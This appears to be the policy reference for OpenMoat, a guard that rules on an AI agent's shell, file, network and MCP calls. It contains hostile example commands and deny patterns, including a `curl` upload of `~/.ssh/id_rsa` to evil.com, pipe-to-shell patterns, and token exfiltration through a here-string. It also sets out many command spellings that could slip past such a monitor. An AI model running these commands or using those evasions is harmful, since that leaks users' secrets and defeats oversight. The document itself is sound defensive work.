# Policy reference (schema v1)

A policy is a YAML document that tells OpenMoat what an agent may do. The installed
user policy lives at `~/.moat/policy.yaml` (or `$MOAT_HOME/policy.yaml`).
`moat init` writes the default; `moat policy lint` validates; `moat policy check`
explains a decision. A project can add rules of its own in `<project>/.moat/policy.yaml`
(§10).

A decision is not itself enforced by the operating system: `allow` means the host runs
the tool call with your permissions. Where a host sandbox (§9) or `moat run` applies,
the operating system also bounds what the call can reach ([SANDBOX.md](SANDBOX.md)).

## 1. Shape

```yaml
version: 1                          # required; only 1 is supported

defaults:                           # verdict when no rule matches
  "*": ask                          #   one verdict for everything, or a map per kind
  net: deny                         #   keys other than the eight kinds and "*" are accepted but never consulted
  fetch: ask                        #   unset, a fetch takes the `net` default

deny:   [ <rule group>, … ]         # evaluated first; a match here is final
allow:  [ <rule group>, … ]         # evaluated second
ask:    [ <rule group>, … ]         # evaluated third

executables:                        # pin program names to absolute paths (enforced, see §8.1)
  git: ["/usr/bin/git", "/opt/homebrew/bin/git"]

sandbox:                            # optional: what the host sandboxes may read beyond the rules (§9)
  read_roots: ["/usr", "~/.cargo"]
  proxy_port: 18080                 # optional, opt-in: send host sandbox traffic through `moat proxy` (§9)

secrets:    [ <secret>, … ]         # values OpenMoat keeps from the agent (§2.1)

taint:                              # optional: more paths session taint protects (§4.1)
  protected_writes: ["**/deploy/**"]
```

`approval:` (`channel`, `remember`, `timeout_s`) and `scope:` (`project_roots`) are reserved:
they are accepted so older policy files stay valid, have no effect yet, and `moat policy lint`
says so. Approvals are made with `moat allow` (§8.2); the project root is the git root of the
call's working directory (§3.2).

Unknown keys are rejected. Rule ids must be unique across all three lists and must
not be empty; a rule group must contain at least one pattern.

## 2. Rule groups

```yaml
- id: secrets-paths                 # stable id; shown to the agent and stored in the audit log
  reason: secret material           # optional; prefixed to the explanation
  fs.read:  ["~/.ssh/**", "**/.env"]
  fs.write: ["~/.ssh/**"]
  shell:    ["curl * | sh"]
  net:      ["*.evil.example"]
  fetch:    ["docs.rs"]
  env.read: ["*_TOKEN"]
  env.set:  ["PATH", "LD_PRELOAD"]
  mcp:      ["mcp__shell__*"]
```

A group matches when **any** of its patterns matches an atomic action of the same
kind. One tool call usually produces several atomic actions (see §4).

| Kind | Matched against | Pattern language |
|---|---|---|
| `shell` | the normalised argument vector of a command, and of every pipeline suffix | token sequence (§3.1) |
| `fs.read`, `fs.write` | the canonical absolute path | glob (§3.2) |
| `net` | the host name only (no scheme, port or path), lowercase; also matches `fetch` actions | glob, case-insensitive |
| `fetch` | the host of a URL a host's own fetch tool reads (Claude Code `WebFetch`), as for `net` | glob, case-insensitive |
| `env.read`, `env.set` | the variable name | glob |
| `mcp` | the full MCP tool name `mcp__<server>__<tool>` | glob |

### 2.1 Brokered secrets (`secrets:`)

```yaml
secrets:
  - id: gh                          # lowercase letters, digits, `-`; unique
    host: api.github.com            # one host, exact: lowercase DNS name or IPv4, no pattern or port
    header: Authorization           # the request header the value goes in
    source: { env: GITHUB_TOKEN }   # or { file: ~/.config/moat/gh } or { keychain: { service: moat, account: gh } }
    plain_http: false               # optional; true also injects into plain-HTTP (clear-text) requests
```

A brokered secret is kept by OpenMoat, not by the agent (ADR-020). The agent holds the
placeholder `moat-secret:<id>:placeholder` instead of the value. `moat proxy` reads the
value from `source` and is the only component that uses it.

- **`source`.** `file` is absolute or under `~/`; the value is its contents without the
  trailing newline. `env` is a variable of the `moat proxy` process. `keychain` is an item
  in the operating system's keychain.
- **`header`** must be an HTTP header name. Headers that frame the request or the
  connection (`Host`, `Content-Length`, `Transfer-Encoding`, `Connection`, `Proxy-*`, …)
  are refused. Two secrets cannot set the same header for the same host.
- **`plain_http`** is off unless set. A plain-HTTP request carries the value in clear text,
  readable by anyone on the network path, so OpenMoat injects into one only for a secret
  that says `plain_http: true`.
- **Never wider.** A secret opens nothing: its host still needs a `net` or `fetch` allow
  rule, or the proxy refuses it.
- **Lint.** `moat policy lint` warns in three cases:
  - no allow rule names the host;
  - no deny rule covers a `file` source (`fs.read`) or an `env` source (`env.read`), so
    the agent could read the value itself;
  - `plain_http: true` is set for a host that is not loopback (`localhost`, `*.localhost`,
    `127.0.0.0/8`).

What the proxy does with them:

- **Injection, plain HTTP with `plain_http: true` only.** In a plain-HTTP request to
  `host` (any port), every `header` line has the placeholder replaced by the value. When
  the request has no such header, `header: <value>` is added. The placeholder elsewhere
  (the path, other headers) is left as it is. The value then crosses the network in clear
  text.
- **Without `plain_http`** the request is forwarded unchanged, still carrying the
  placeholder, and the server rejects it. The audit row says
  ``secret `<id>` not injected``.
- **HTTPS (CONNECT)** is not decrypted, so a request there carries the placeholder and
  the server rejects it. Injection into HTTPS needs opt-in TLS termination, which is not
  built (#172).
- **Leak blocking.** The proxy refuses a request to any other host that carries the
  placeholder or the value, in its head or plain-HTTP body (`proxy-secret`, §5.1).
- **Audit masking.** A value of 8 bytes or more is replaced by `[redacted]` wherever it
  occurs in an audit row the proxy records, and in the row of a call `moat guard`
  decides when its source is a `file` or `env` the guard can read (ARCHITECTURE.md §7).

`moat proxy` reads every source at start-up and refuses to start (exit 64) if one cannot
be read or holds a control character. It prints each secret's id, host, header and
placeholder, which is what to give the agent (for example
`GITHUB_TOKEN=moat-secret:gh:placeholder`), and never the value. A keychain source uses
`/usr/bin/security` on macOS and `/usr/bin/secret-tool` (libsecret) on Linux. Keychain
sources are not supported on Windows yet.

## 3. Pattern syntax

### 3.1 Shell patterns
Tokenised with the same lexer as commands, so `a|b` and `a | b` are equal.

- Each token is a glob matched against exactly one argument: `git push --force*` matches `git push --force-with-lease`.
- git's global options are the one normalisation: `git -C dir push --force`, `git -c k=v reset --hard` and `git --git-dir=x push …` are matched as `git push --force`, `git reset --hard` and `git push …`, and `-C`/`--git-dir`/`--work-tree` values are `fs.read`s. A `-c`/`--config-env` key outside a short inert list (`color.*`, `user.name`, `core.quotepath`, …), `--exec-path=` or an unknown global option can make git run a program (`core.fsmonitor`, `core.hooksPath`, `alias.*`, `credential.helper`, `include.path`, …), so the command is also checked as written, which no `git <subcommand>` allow matches.
- Tokens are compared as written; flags are not normalised. `rm -rf ~` does not match `rm -fr ~` or `rm -r -f ~`; list every spelling you mean, or guard the path instead: an `fs.write` rule sees every spelling of it (the default `destructive` rule denies `fs.write` of `~` and `/`).
- A bare `*` matches **any number** of arguments, including none: `sudo *` matches `sudo`, `curl * | sh` matches `curl -fsSL https://x | sh -s`.
- A pattern is a **prefix**: `git status` also matches `git status --short`.
- A leading `!` makes the pattern an exclusion within its list, as for globs (§3.2): `shell: ["find *", "!find * -exec*"]` allows `find . -name x` but not `find . -exec rm {} \;` (ADR-012).
- A trailing bare `$` ends the match: the command must have no further arguments. `env $` matches `env` alone, not `env FOO=1 git status`; `export -p $` matches `export -p` but not `export -p FOO`. A `$` anywhere else is an ordinary token, and a pattern that is only `$` is rejected by the linter (ADR-010).
- Pipelines and lists are matched per command **and** as whole suffixes, so `base64 -d | sh` is caught in `echo … | base64 -d | sh`. `|&` (pipe stdout and stderr) is a `|`.
- A decoder stage that feeds an interpreter reading stdin, anywhere later in the same pipe chain, is also reported as the canonical pipeline `<decoder> -d | <interpreter>` (`base64 -D x | tr a b | bash -s` → `base64 -d | bash`), so one rule `* -d | bash` covers every decoder spelling. An interpreter given a script file or inline code (`bash build.sh`, `sh -c …`) is not reading its program from stdin and does not produce it.
- A copy or move (`cp`, `mv`, `ln`, `rsync`, `scp`) into a directory writes the entry named after each source, not the directory (`shell/copy.rs`): `cp f ~/` and `cp -t ~ f` write `~/f`, `rsync -a dist ~/` writes `~/dist`. A destination is a directory when it ends with `/`, is `~`, `.`, `..` or `$HOME`, or is given with `-t DIR`/`--target-directory` (`cp`, `mv`, `ln`). Any other destination (`mv dir newname`, or anything under `-T`) may be replaced itself, so it stays the write; `mv` also writes each source, so `mv ~ /tmp/` is still a write of `~`. When the names copied in are not on the command line (a source ending with `/`, whose contents `rsync` copies; `~`, `.` or `..` as the source; a word the shell expands such as `*` or `$X`; or a remote source such as `host:f`) the directory itself stays the write, since any entry in it may be replaced. A remote `scp`/`rsync` destination (`host:/tmp/`, `rsync://host/m`) is on another machine and is not a local write.
- Commands inside `sh -c "…"`, `eval`, `$( … )`, backticks, subshells and wrappers (`sudo`, `env`, `xargs`, `timeout`, `nohup`, …) are classified as their own commands. A `)` with no matching `(`, or a `(` never closed, makes the command `unparseable`.
- A `<<<` here-string is the command's stdin, not a file: `cat <<< ~/.ssh/id_rsa` prints text and reads nothing. `$( … )` and `$VAR` inside it are evaluated like anywhere else (`cat <<< "$(curl …)"`, `curl -d @- … <<< "$GITHUB_TOKEN"`), and a shell or interpreter that reads its program from stdin runs it (`bash <<< 'cat ~/.ssh/id_rsa'` is classified as `cat ~/.ssh/id_rsa`).
- A here-document body is stdin data too. With an unquoted delimiter the shell expands `$( … )`, backticks and `$VAR` in it, so they are evaluated (`cat <<EOF` with a `$(curl …)` line is a network action); a quoted delimiter (`<<'EOF'`, `<<"EOF"`, `<<\EOF`) keeps the body literal. `<<-` strips leading tabs from every body line, as the shell does, before the body is classified. Either way a shell or interpreter reading its program from stdin runs the body (`bash <<'EOF'` is classified as the commands in it). The same holds one pipe later when the line shows the data: a bare `cat` passes on its here-document or here-string, and `echo`/`printf` their arguments, so `cat <<'EOF' | sh` and `echo 'cmd' | sh` are classified like `sh <<'EOF'`. Only `\n` is read in that text: any other escape, or a `printf` `%` format, means the line does not show what is printed (`printf '\x63at .env' | sh`), and the shell then asks. Data that passes through another program first (`… | tee log | sh`) is not followed; the shell then asks.
- A shell's options are read the way the shell reads them, for `sh`, `bash`, `zsh`, `dash`, `ksh` and `fish`: `c` anywhere in a cluster (`bash -lc`, `sh -ec`, `zsh -ic`), long options (`--login`, `--norc`, `--rcfile FILE`; none for `sh`, since dash rejects them all), options that take a value (`-o pipefail`, `+O extglob`) and `--` all lead to the same command string, which is classified on its own. `bash -o pipefail` reads its program from stdin; `pipefail` is not a script. An option the classifier does not know for that shell (`bash --frobnicate -c …`) makes the command `unparseable`, because it could consume the command string.
- `make` (and `gmake`) arguments that run code of the caller's choosing become their own `make <argument>` shell action, so a `make test*` allow does not cover them: `--eval`/`-E` text, `-e`/`--environment-overrides`, and the variables `SHELL`, `.SHELLFLAGS`, `MAKESHELL`, `MAKEFLAGS`, `MFLAGS`, plus any `NAME!=command`. The `--eval` text, `!=` commands, `$(shell …)` calls in variable values and the `SHELL=` program are classified as commands; `--file=`, `--makefile=`, `--directory=` and `--include-dir=` values are file reads. `make build -j4 CC=clang` is unaffected.
- Text tools (`sort`, `uniq`, `cut`; `shell/text.rs`) have their options read the way getopt reads them, GNU order included (options after operands). An option value is data, not a file: `cut -d '/' -f 2 x` reads only `x`. A value that follows an operand is also a file, since BSD getopt stops at the first operand. Files they write are `fs.write`s: `sort -o FILE`/`--output`/`-T DIR` and `uniq`'s second operand (`uniq in out`). An option the classifier does not know, including GNU abbreviations of long options, becomes its own `<program> @<option>` shell action (`sort @--compress-program=gzip`), which `text-tools` excludes, so the command asks.
- A `sed` script is data too (`shell/sed/`): its words are not files (`sed -n '/^fn/,/^}/p' f` reads only `f`). The script is read with the commands and addresses GNU and BSD sed share (`p`, `d`, `s///`, `y`, `a`/`i`/`c`, `b`/`t`/`:`, `q`, `l`, `=`, `n`, `N`, `g`, `h`, `x`, `{}`, …). `r FILE`/`R FILE` are `fs.read`s and `w FILE`/`W FILE`/the `s///w FILE` flag `fs.write`s of `FILE` taken literally (sed does not expand `~`). A script that runs a command (`e`, the `s///e` flag), uses any other command, or cannot be read completely becomes a `sed @<script>` shell action, as do `-f FILE` (whose `FILE` is also an `fs.read`) and unknown options. `-i`/`--in-place` makes every file operand an `fs.write`, and its backup too (`-i.bak` writes `f.bak`; a suffix with `/` or `*`, which GNU sed reads as another directory, is reported). A bare `-i` is read both ways: GNU sed takes no suffix, BSD sed takes the next word. `-i ''` is the BSD empty suffix (the next operand is checked as a script and as a file), `-i -e …` gives BSD the suffix `-e`, and any other word after a bare `-i` (`sed -i 's/a/b/' f`, a script to GNU and a suffix to BSD) is reported.
- An `awk` program is data as well (`shell/awk.rs`); its words are not files (`awk '/error/ {print}' log` reads only `log`). awk stops reading options at the program, so only `-F` and `-v` before it are options, and every later word is a file or an assignment. A program containing `system`, a `|` that is not part of `||`, `getline`, `ENVIRON`, `ARGV` or `@` (gawk's `@include`, `@load`, indirect calls), or a `>` after its first `print` (output redirection), becomes an `awk @<program>` shell action, as do `-f FILE` and any other option. These words are looked for in the raw text, strings and regexes included, so quoting cannot hide them, and a string that happens to contain one asks.
- Only a `$` the shell expands is an `env.read`: an unquoted or double-quoted `$NAME`/`${NAME}` (`"$AWS_SECRET_ACCESS_KEY"` is a read), one in an unquoted here-document body, or one in a `<<<` word outside single quotes. The lexer records which part of each word came from single quotes, so `$p` in `sed -n '$p'` and `$NF` in `awk '{print $NF}'` read nothing, and in `'$p'"$TOKEN"` only `TOKEN` is read. Code handed to another shell is classified again as that shell sees it: `sh -c 'echo $SECRET'` and `eval 'echo $SECRET'` read `SECRET`. `$'…'` (ANSI-C quoting, which decodes escapes) is still scanned as if unquoted, and a quoted here-document delimiter (`<<'EOF'`) keeps the body literal. `$1`-style field references are not variables and stay allowed. Where GNU and BSD sed would split a script differently (a delimiter inside a bracket expression, text after a label), or take a different word for the script (BSD stops at the first operand, so in `sed p -e x f` it runs `p` and reads `-e` and `x`), every reading is checked and the word stays a file too.

### 3.2 Path, host and name globs
- `*` matches within one path segment; `**` matches across segments: `~/.ssh/**`, `**/.env.*`.
- Hosts are matched lowercase without userinfo, port, trailing dot or IPv6 brackets (`http://u@[::1]:8080/` is `::1`). A word with a scheme is always a URL, so `http://localhost`, `http://intranet` and numeric forms such as `http://2130706433/` are network actions; a word without a scheme counts only as a dotted name under a known top-level domain or an IPv4 address.
- `~` and `${project}` are expanded in patterns before matching; `${project}` is the git root above the call's working directory (or the directory itself when there is no repository). When the project root or the home directory is reached through a symlink (macOS `/tmp` → `/private/tmp`, `~/code` → `/Volumes/dev/code`, a Windows 8.3 short name), each pattern naming it is expanded for both spellings, exclusions included: `${project}/**` matches `/tmp/x/a` and `/private/tmp/x/a`, and `!${project}/.git/**` excludes both. When `MOAT_HOME`, `CLAUDE_CONFIG_DIR`, `CODEX_HOME` or `CURSOR_CONFIG_DIR` moves `~/.moat`, `~/.claude`, `~/.codex` or `~/.cursor`, a pattern naming that directory or a path below it also matches the same path under the moved one (as written and with its symlinks resolved): with `CLAUDE_CONFIG_DIR=/srv/claude`, `~/.claude/settings.json` also matches `/srv/claude/settings.json`. The CLI reads the variables and the directories `moat init` recorded (`~/.moat/hosts.json`), and both are covered when they differ; the hook, `moat policy check`, `moat run` and the Standard-tier settings all see the moved directories. `$HOME` and `${HOME}` are expanded in the *action's* path (so `cat $HOME/.ssh/id_rsa` is seen as `~/.ssh/id_rsa`) but not in patterns: write `~` in rules.
- A leading `~name` in an action's path is a home directory, as the shell expands it: `~me/x` is `~/x` when `me` is the last component of your home directory. Any **other** `~<otheruser>` cannot be placed from the pure core: homes do not always sit next to each other (root's `/root` on Linux, homes under `/srv`, networked homes, Windows service accounts), so a guessed `/<parent-of-home>/<name>` could judge one path while the OS reads another. `~<otheruser>` is therefore unresolvable: a command naming it asks with rule `unparseable`, as `~-` already does, and `moat guard` never claims a cross-user path is allowed from a layout guess (#400). `~+` is the working directory. `~-` (the shell's previous directory) cannot be known, so a command naming it asks with rule `unparseable`.
- The project root is never the home directory, one of its ancestors or a filesystem root (`/`, `C:/`, a UNC share), compared as written and with symlinks resolved. A git root that is one of these (a dotfiles repository in `~`) is skipped in favour of the working directory itself; when that is one too (a session started in `~` or `/`), the call has **no project**: every pattern naming `${project}` matches nothing (and a negated one excludes nothing), so project-scoped allows do not apply and those actions fall through to `ask` and the defaults. Deny rules are unaffected. `moat policy check --project ~` is refused with exit 64.
- A pattern ending in `/**` also matches the directory itself: `~/.ssh/**` matches `~/.ssh`, so a recursive read (`grep -r . ~/.ssh`, `tar czf k.tgz ~/.ssh`) or a removal (`rm -rf ~/.gnupg`) of the directory meets the rule that guards its contents, and `!${project}/.git/**` also excludes `.git` itself.
- A recursive read of an *ancestor* of a guarded directory (`grep -r . ~`, `rg -uu . ~/.config`, `find ~`, `tar czf h.tgz ~`, `cp -r ~ …`, `zip -r`, `rsync -a`) is checked on the directory it names, which no deny rule matches. In the default policy no allow rule covers the home directory or `~/.config` either, so these ask (`default`) and the person sees the whole command; a user rule that allows reading `~` or `~/**` would allow them too, contents of `~/.ssh` included. Inside a project the project root is allowed by `project-fs`, so `grep -r TODO .` stays allowed even when the project holds a `.env`: denying every recursive search of a project would make the default unusable, and a named `.env` is still denied.
- A leading `!` excludes matches within the same list of the same group, in `deny`, `allow` and `ask` alike: a candidate matches when at least one positive pattern matches and no negated pattern does. Example: `fs.write: ["${project}/**", "!${project}/.git/**"]`.
- Paths are compared in slash-separated canonical form on every platform (`C:/Users/me/x` on Windows, never the `\\?\C:\…` verbatim form), case-insensitively on macOS and Windows.

## 4. How a decision is made

```
tool call ──► atomic actions ──► per action: deny → allow → ask → defaults ──► strictest wins
```

1. The host's tool call becomes one `Action` (shell command, file read, file write, URL, MCP tool).
2. The classifier expands it into atomic actions. `curl -d @~/.ssh/id_rsa https://evil.com` becomes a `shell` action, an `fs.read` of `~/.ssh/id_rsa` and a `net` action for `evil.com`.
3. Each atomic action is evaluated in order `deny → allow → ask`; the first list containing a match decides it. A repository policy's `ask` rules are tried right after `deny` (§10). If nothing matches, `defaults` decides (`default.<kind>` when a per-kind default exists, otherwise `default`).
4. The verdict for the tool call is the **strictest** across its atomic actions: `deny > ask > allow`.
5. Input the lexer cannot understand (unbalanced quotes, unterminated `$(`, nesting deeper than 4 levels, more than 64 KB, more than 2048 atomic actions) is `ask` with rule id `unparseable`, never `allow`. When only part of a call cannot be classified (one simple command or nested `$( … )` of a command line, a relative path after an unknown `cd`, one MCP URL argument with no host), that part is one more `unparseable` ask and every other part is still decided; step 4 then applies, so `cd "$X" && cat notes ~/.ssh/id_rsa` and an MCP call reading `~/.ssh/id_rsa` with a malformed `url` are denied by `secrets-paths`, not asked. What follows the failure inside the same simple command or nested command is not classified. Input that does not lex at all yields no parts and asks.

Consequences worth remembering:

- **Deny is absolute.** No allow rule can override a deny rule. To express "nothing of this kind except these", use `defaults` plus allow rules, as the default policy does for `net`.
- A `fetch` is a narrower kind of `net` (ADR-017): `net` patterns in `deny`, `allow` and `ask` match it as well as `fetch` patterns, and with no `defaults.fetch` the `net` default decides it. A `fetch` pattern never matches other network access, so `curl`, `wget`, `nc`, a Claude Code `Monitor` WebSocket and MCP `url` arguments are only judged by `net` rules.
- An allow rule on `shell` does not allow the paths or hosts the command touches; those are evaluated separately. `cat ~/.ssh/id_rsa` is denied by the path rule even though `cat *` is allowed.
- Arguments that name files become `fs.read`/`fs.write` actions even when they are relative: any word containing `/` (`s/id_rsa`, `src/main.rs`, the value of `--in=keys/k`), and every operand of programs that read or write their operands (`cat`, `head`, `tail`, `less`, `grep`, `rg`, `wc`, `diff`, `base64`, `tar`, `ls`, `find`, `cp`, `mv`, `rm`, `tee`, … ; `shell/tables.rs`), so `cat k` is a read of `<cwd>/k`. Options before `--`, URLs, remote specs (`host:dir`) and the arguments of `echo`/`printf` are not files. Inside the project these reads cost nothing (`project-fs` allows them); an option value such as the `5` in `head -n 5 f` becomes a harmless read of `<cwd>/5`.
- Relative paths follow `cd` and `pushd` earlier in the same command line: `cd ~/.ssh && cat id_rsa` is a read of `~/.ssh/id_rsa`. Which commands run after a `cd` succeeds is not modelled (`cd x || cat y`, a failed `cd` before `;`), so a relative path is checked in every directory the line may be in (the session's directory and each `cd` target), strictest wins. A subshell `( … )` restores the directory when it closes; `$( … )` and `sh -c` start from the directory where they appear. `cd` alone is `~`. A target that cannot be known (`cd "$DIR"`, `cd -`, `cd s*`, `pushd +1`, `popd`, and `eval`/`source`, which may `cd` themselves) makes every later relative path unresolvable, so the command asks with rule `unparseable`; absolute paths are still checked normally. More than 16 possible directories also asks. `cd` itself adds no new action (a path-looking target is an `fs.read` like any argument). `CDPATH` is not consulted: the shell searches it for a target that does not start with `/`, `./` or `../`, but the classifier cannot see the environment the host started the shell with, so such a target is taken relative to the current directory. Setting `CDPATH` on the line itself (`CDPATH=~ cd .ssh`, `export CDPATH=…`) is an `env.set` with no allow rule and asks, and the shell start-up files that could preset it are denied by `shell-rc`.
- `moat guard` checks a path where it really points as well as where it was written: after `ln -s ~/.ssh ./s`, `cat ./s/id_rsa`, `cat s/id_rsa`, `head s/id_rsa` and `grep -r . s/` are denied by `secrets-paths`. A link inside the project that points elsewhere inside the project stays allowed; one that points outside it is checked at its target (`ln -s /etc e; cat e/hosts` asks), also when the project itself sits under a linked directory (§3.2). `moat policy check` resolves symlinks the same way. Hard links and a link swapped after the check are not seen (ADR-009).
- A path operand or redirection target with an unquoted `*`, `?` or `[` is a glob the shell expands before the command runs, so it is checked as written **and** as every path it names in the real directories: `cat .en?`, `cat .e*`, `cat .[e]nv`, `base64 < .en?` and `cat ~/.ss?/id_rsa` are denied by `secrets-paths` like `cat .env`. The expansion follows `bash`: `*`, `?` and classes (`[ab]`, `[!a]`, `[^a]`) do not match a leading `.` unless the pattern starts with one (`cat *` does not read `.env`, `cat .e*` does), `**` is taken as any number of directories (as with `globstar` or in `zsh`), and a pattern that matches nothing is only its literal word. A component without glob characters after a globbed directory is named whether or not the file exists yet (`~/.ss?/id_rsa` names `~/.ssh/id_rsa` once `~/.ssh` matches), and every match is resolved through symlinks. A quoted or escaped pattern (`cat '.en?'`, `cat .en\?`) is one literal name; an operand with the same text as an unquoted glob elsewhere in the command line is expanded too. Directories are listed only for such operands. When the globs of one call name more than 256 paths, list more than 1024 directories or descend more than 8 levels of `**`, the call asks with rule `unparseable`, and a deny among the paths that were named still wins. `moat policy check` expands globs the same way; without a filesystem (`decide()` with no resolver, the conformance suite without `files`) only the literal is checked.
- Unquoted braces make several words before any other expansion, without the filesystem, as in `bash`: `cat .{env,x}` is checked as `cat .env .x`, so `cat .{env,x}`, `cat .e{n,m}v`, `cat ~/.ssh/{id_rsa,x}` and `{cat,.env}` are denied by `secrets-paths`. Comma lists, nested braces, integer and letter sequences with an optional step and zero padding (`{1..3}`, `{a..e..2}`, `{01..10}`) and several groups in one word (`{a,b}{1,2}`) are expanded in any position, the command name included, and each word made goes through the rules above (`cat .{e,x}n?` is globbed). As in `bash`, `{}`, `{x}`, `{a,b` and invalid sequences stay literal, `${…}` is a variable, quoted or escaped braces (`cat '.{env,x}'`, `\{a,b}`) are one literal name, empty results are dropped and a here-string is not expanded. A word whose braces would make more than 256 words asks with rule `unparseable`; a deny elsewhere in the call still wins.
- The explanation names the rules that produced the final verdict; weaker matches are shown as context (`also:` lines, `context` in JSON).

### 4.1 Session taint

Earlier calls of the same session can make a later call stricter (ADR-020). Taint never
loosens a decision: it adds an `ask` with rule id `session-taint` and merges it like any
other atomic action, so an `allow` becomes `ask` and a `deny` stays `deny`.

| Once the session has… | …these atomic actions ask |
|---|---|
| read secret material: an `fs.read` that the group with id `secrets-paths` names, in whichever list it sits | `net` and `fetch` to every host except the secret's own, and every `mcp` call (OpenMoat cannot see an MCP server's hosts) |
| read untrusted content: a `fetch`, or the result of an `mcp` call | `fs.write` to a protected path |

`secrets-paths` is a **taint-significant rule id**: the engine recognises the base id in `deny`, `repo_ask`, `allow` and `ask`, and recognises `repo:secrets-paths` the same way (a repository policy's group is renamed to `repo:<id>` on merge, §10). Keep the id as `secrets-paths` on any `fs.read` group that names secret material; a rename hides those reads from taint and lets an approved secret read leave the session untainted (#398).

- A secret read from a file belongs to no host, so every host asks. A secret the secrets
  broker (#172) injects will carry its own host, and only that host stays as decided.
- In the default policy `secrets-paths` denies, so no secret read runs and none taints.
  The trigger matters when your policy moves `secrets-paths` to `ask`: once you approve
  the read, the session is tainted.
- Protected paths are files whose change runs code or steers the agent later. The built-in
  list (`taint.rs`) is CI (`.github/workflows/**`, `.gitlab-ci.yml`, `.circleci/**`), git
  hooks (`.husky/**`, `.githooks/**`), editor tasks (`.vscode/**`), build scripts the
  allowed dev commands run (`package.json`, `Makefile`, `build.rs`), and agent instructions
  and settings (`CLAUDE.md`, `AGENTS.md`, `.claude/**`, `.codex/**`, `.cursor/**`,
  `.cursorrules`, `.mcp.json`), at any depth.
- `taint: { protected_writes: [<glob>, …] }` adds path globs (§3.2, `~` and `${project}`
  included) to that list. It only extends: a policy cannot remove a built-in path, and
  `moat policy lint` rejects a `!` exclusion as well as a glob that does not compile.
  Without the key, the built-in list applies alone.
- Shell network to an allowed host (`git fetch`, `gh pr view`) is not counted as untrusted
  content, and a command OpenMoat cannot classify taints nothing it can name.
- `moat guard` reads the history from the audit log: the earlier events of the same host
  session that may have run. Those are allowed calls, and asks on a host that can ask. A
  declined ask is not recorded, so it counts as run. Codex turns an ask into a deny, so
  an ask under Codex never taints. The agent cannot reset its session's taint, and a log
  that cannot be read denies the call (`kernel-error`).
- Conformance fixtures express a chain with `session:`, the earlier calls that ran.

## 5. Verdicts and what the host does

The verdict is the same for every host; the response document is the host's own format.

| Host event | `allow` | `ask` | `deny` |
|---|---|---|---|
| Claude Code and Codex `PreToolUse` | `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"moat: allow [rule]"}}`, exit 0 | same with `"ask"`, exit 0; the host prompts the user with the reason | same with `"deny"`, reason also on stderr, exit 2; the agent sees the rule id and reason |
| Cursor `beforeShellExecution`, `beforeMCPExecution`, `beforeReadFile`, `preToolUse` | `{"permission":"allow","user_message":"moat: allow [rule]","agent_message":"…"}`, exit 0 | `"permission":"ask"`, exit 0 | `"permission":"deny"`, exit 2 |
| Claude Code `ConfigChange` | `{}` (the changed settings file is loaded), exit 0 | not produced | `{"decision":"block","reason":"moat: deny [kernel-integrity] — …"}`, exit 2; the session keeps its previous settings |

The reason line has the shape `moat: <verdict> [rule, rule] — reason; reason`.

### 5.1 Rule ids that are not in your policy

These appear in responses and in `moat show` alongside the ids from `policy.yaml`:

| Rule id | Verdict | When |
|---|---|---|
| `default`, `default.<kind>` | from `defaults` | no rule matched the atomic action |
| `unparseable` | ask | the shell command or URL, or part of it, could not be classified safely (§4 step 5) |
| `executables` | deny | the command's program resolves to a path other than its pin (§8.1) |
| `kernel-integrity` | deny | a file pinned by `policy.lock` changed, disappeared or was replaced by a symlink (§8); every call is denied until a person re-pins |
| `kernel-error` | deny | `moat guard` could not evaluate at all: missing state directory, malformed payload, unreadable policy, a repository policy that cannot be read or parsed (§10); exit 2 |
| `repo:<id>` | from its list | a rule of the project's repository policy (§10) |
| `ungoverned` | allow | the host tool is outside policy scope (for example Claude Code `Task`, or `Shell` under Cursor's `preToolUse`, which `beforeShellExecution` already governs); recorded, not evaluated |
| `config-change` | allow | a Claude Code `ConfigChange` for a settings file that is not pinned, or still matches the lock; a change that names no file is allowed only while every pinned file matches the lock; recorded |
| `session-taint` | ask | earlier calls of the session read secret material or untrusted content, and this call could carry the secret out or persist the content (§4.1) |
| `approved-session` | allow | an `ask` for a shell command that a person granted with `moat allow` for this host session (§8.2) |
| `approved-<n>` | allow | a permanent rule in `~/.moat/policy.d/approved.yaml` written by `moat allow --always` |
| `proxy-address`, `proxy-sni`, `proxy-request`, `proxy-upstream`, `proxy-secret` | deny | `moat proxy` refused a connection: a loopback, link-local, metadata, or unnamed private destination, a TLS server name that does not match the CONNECT host, a request it does not serve, a destination it could not reach, or a brokered secret sent to a host other than its own (§2.1, §5.2) |

### 5.2 `moat proxy`

`moat proxy` decides each connection's host with the same policy and matcher as a fetch
tool's URL. Each host is one `fetch` atom, so `fetch` and `net` lists both apply, deny rules
first. Differences from the hook:

- The proxy cannot prompt. A host whose verdict is `ask` is refused, and so is a host with
  no rule under the default policy (`defaults: fetch: ask`). To open a host to the proxy,
  allow it in a `net` or `fetch` list.
- A `fetch` allow opens the host to every method through the proxy, including requests with a
  body. Inside a CONNECT tunnel the method cannot be seen until TLS termination exists.
- Loopback, link-local, cloud metadata (`metadata.google.internal`, `metadata.goog`,
  `100.100.100.200`, `fd00:ec2::254`) and non-unicast destinations are refused whatever the
  policy allows. This applies to the name as written and to every address it resolves to.
  `local-net` and an allow for `localhost` do not reach this machine through the proxy.
- Private and shared addresses are refused unless the policy names them: `10.0.0.0/8`,
  `172.16.0.0/12`, `192.168.0.0/16`, `100.64.0.0/10` (CGNAT), `198.18.0.0/15`
  (benchmarking) and `fc00::/7` (unique local), including IPv4-mapped,
  IPv4-compatible and NAT64 spellings. This is checked on the name as written and on
  every address it resolves to. One such address refuses the whole name, so a wildcard
  allow whose name resolves into the LAN (DNS rebinding) does not reach it.
  To open one, list the address in a `net` or `fetch` allow, either exactly
  (`10.0.0.5`, `fd12::7`) or as a glob that starts with a digit or contains `:`
  (`192.168.1.*`, `fd12::*`). There is no CIDR syntax. The pattern is matched against
  the resolved address in canonical text form (`::ffff:10.0.0.5` is matched as
  `10.0.0.5`; a NAT64 or IPv4-compatible address only by its IPv6 text). A deny rule
  matching that text still wins. Patterns starting with `*`, `?`, `[` or `{`, and name
  patterns such as `*.corp.example`, never open a private address.

### 5.3 What an operating-system layer can enforce

The policy compiler (ADR-019) derives from `policy.yaml` what an OS layer (a host's
sandbox, Seatbelt, Landlock, the egress proxy) enforces. `moat policy compile [--format
json]` prints it. The host sandboxes of Claude Code, Codex and Cursor (§9) and the
Seatbelt and Landlock rules of `moat run` are generated from it.

- **OS-enforceable:** `fs.read`, `fs.write`, `net` and `fetch` rules and their defaults.
  Patterns are expanded for the session (`~`, `${project}`, both spellings of a linked
  root), and `!` exclusions are kept.
